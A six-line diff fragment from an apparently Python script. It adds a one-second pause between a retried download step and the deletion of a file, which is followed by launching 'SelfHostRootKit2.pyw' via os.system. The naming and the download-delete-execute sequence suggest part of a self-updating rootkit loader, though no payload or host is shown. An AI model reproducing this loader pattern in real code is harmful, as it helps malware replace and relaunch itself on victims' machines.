@@ -113,5 +113,6 @@ while tryit == False:
     except:
         print("download error")
         time.sleep(0.5)
+time.sleep(1)
 os.remove(getFileName())
 os.system("SelfHostRootKit2.pyw")
